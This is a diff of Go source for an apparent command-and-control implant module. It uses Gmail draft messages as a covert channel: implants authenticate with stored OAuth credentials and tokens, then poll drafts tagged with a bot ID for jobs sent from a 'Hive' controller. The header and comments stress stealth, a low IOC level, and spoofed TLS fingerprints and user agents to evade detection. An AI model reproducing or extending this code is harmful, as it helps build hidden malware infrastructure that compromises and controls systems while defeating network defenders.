@@ -5,7 +5,7 @@
 //
 //   Warnings:       The top notch stealth                   
 //                   
-//   Fingenprint:    GO-LANG TLS Libraries (target OS network stack?)
+//   Fingenprint:    Selected Client TLS Fingerprint and user agent
 //
 //   IOC Level:      Low
 //   
@@ -24,8 +24,6 @@ import (
     "net"
     "crypto/tls"
     "time"
-
-    //"fmt"
     "os"
     "bytes"
     "golang.org/x/net/context"
@@ -34,18 +32,15 @@ import (
     "google.golang.org/api/gmail/v1"
 )
 
+/*
+JSON Structures for Compiling Redirectors Network Module parameters
+Hive will have the same definitions in: ./src/hive/hiveImplants.go
+*/
 type Gmail struct {
     Name string   `json:"name"`    
     Creds string   `json:"creds"`
     Token string   `json:"token"`
 }
-
-/*
-type Reds struct {
-    Redirectors []string   `json:"redirectors"`
-}
-
-*/
 
 type BiGmailMimic struct {
     UserAgent string `json:"useragent"`
@@ -76,7 +71,12 @@ type BiAuth struct {
     Token string  `json:"token"`  
 }
 
-//With this modules Redirectors will be already an []*Gmail
+/*
+Description: GmailMimic,Prepare Redirector Slice
+Flow:
+A.JSON Decode redirector data, for gmail modules, connected app refresh token/creds are needed (redirectors are basically gmail accounts)
+B.Loop over each redirector and craft a working gmail account to connect to
+*/
 func PrepareNetworkMocule(jsonstring string) []string{
 
     var coms *BiGmailMimic
@@ -98,7 +98,16 @@ func PrepareNetworkMocule(jsonstring string) []string{
 	return coms.Redirectors
 }
 
-//Use Https to retrieve from redirector Jobs for this Bot
+/*
+Description: GmailMimic, Retrieve Jobs from gmail draft mails that come from Hive
+Flow:
+A.Provided redirector (gmail creds) and auth JSON, retrieve BID
+B.Retrieve gmail credentials from JSON, create a oauth google client and request access token
+    B1.Use "Rebugo" new functions to set a TLS fingerprint to be used in both goole oauth and gmail client, also provide a target user agent
+C.With the access token, list the draft and check if a mail draft thread exist with actual BID, if no create it
+D.If a draft with BID subject exists, check if has redirector data "to:bichito@stime.xyz" and subject this BID
+E.If exists, retireve body ,decode it and return (these are the jobs that come from hive to be processed)
+*/
 func RetrieveJobs(redirector string,authentication string) ([]byte,string){
 
     var result []byte
